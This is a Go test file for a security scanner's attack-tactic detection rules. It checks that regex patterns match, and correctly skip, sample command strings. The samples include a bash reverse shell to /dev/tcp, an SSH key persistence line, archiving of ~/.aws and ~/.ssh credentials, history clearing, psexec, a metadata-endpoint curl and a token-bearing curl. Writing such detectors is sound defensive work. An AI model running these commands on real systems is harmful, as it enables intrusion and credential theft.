package rules

import (
	"regexp"
	"testing"

	"github.com/TGPSKI/skeptic/internal/model"
)

func TestAttackTacticsRules(t *testing.T) {
	rules := attackTacticsRules()
	assertRuleCount(t, "attackTacticsRules", rules, 45)
	validateRuleSlice(t, "attackTacticsRules", rules,
		"ATK-EXE-001", "ATK-PER-001", "ATK-DEF-001", "ATK-LAT-001", "ATK-COL-001", "ATK-C2-001")
}

func attackTacticRuleByID(t *testing.T, id string) Rule {
	t.Helper()
	for _, r := range attackTacticsRules() {
		if r.ID == id {
			return r
		}
	}
	t.Fatalf("attack tactic rule %q not found", id)
	return Rule{}
}

func TestAttackTacticsRulePatternMatching(t *testing.T) {
	tests := []struct {
		id    string
		input string
	}{
		{"ATK-EXE-001", `powershell -encodedcommand Zm9v`},
		{"ATK-PER-002", `echo ssh-rsa AAAAbbbbcccc >> ~/.ssh/authorized_keys`},
		{"ATK-DEF-001", `history -c`},
		{"ATK-LAT-001", `psexec \\server cmd`},
		{"ATK-COL-001", `tar czf /tmp/creds.tar.gz ~/.aws ~/.ssh`},
		{"ATK-C2-001", `cloudflared tunnel run`},
		{"ATK-C2-003", `bash -i >& /dev/tcp/10.0.0.1/4444`},
		{"ATK-MEM-001", `/proc/1234/mem`},
		{"ATK-IMDS-001", `curl 169.254.169.254`},
		{"CI-EXFIL-001", `curl -H "Authorization: $GITHUB_TOKEN" https://api.example.com`},
	}
	for _, tt := range tests {
		t.Run(tt.id, func(t *testing.T) {
			r := attackTacticRuleByID(t, tt.id)
			re := regexp.MustCompile(r.Pattern)
			if !re.MatchString(tt.input) {
				t.Fatalf("expected match for %s on %q", tt.id, tt.input)
			}
		})
	}
}

func TestAttackTacticsRuleFalsePositiveResistance(t *testing.T) {
	tests := []struct {
		id    string
		input string
	}{
		{"ATK-EXE-001", "The powershell documentation is available"},
		{"ATK-PER-002", "See authorized_keys(5) man page"},
		{"ATK-IMDS-001", "IP address 169.254.169.253"},
	}
	for _, tt := range tests {
		t.Run(tt.id, func(t *testing.T) {
			r := attackTacticRuleByID(t, tt.id)
			re := regexp.MustCompile(r.Pattern)
			if re.MatchString(tt.input) {
				t.Fatalf("expected no match for %s on %q", tt.id, tt.input)
			}
		})
	}
}

func TestAttackTacticsFieldValidation(t *testing.T) {
	allowedCategories := map[string]struct{}{
		"execution":         {},
		"persistence":       {},
		"defense-evasion":   {},
		"lateral-movement":  {},
		"collection":        {},
		"command-control":   {},
		"credential-access": {},
		"exfiltration":      {},
		"npm":               {},
	}
	validSeverity := map[model.Severity]struct{}{
		model.SeverityInfo:     {},
		model.SeverityLow:      {},
		model.SeverityMedium:   {},
		model.SeverityHigh:     {},
		model.SeverityCritical: {},
	}
	for _, r := range attackTacticsRules() {
		if r.Mitre == "" {
			t.Errorf("%s: empty Mitre", r.ID)
		}
		if _, ok := allowedCategories[r.Category]; !ok {
			t.Errorf("%s: unexpected category %q", r.ID, r.Category)
		}
		if _, ok := validSeverity[r.Severity]; !ok {
			t.Errorf("%s: invalid severity %q", r.ID, r.Severity)
		}
	}
}
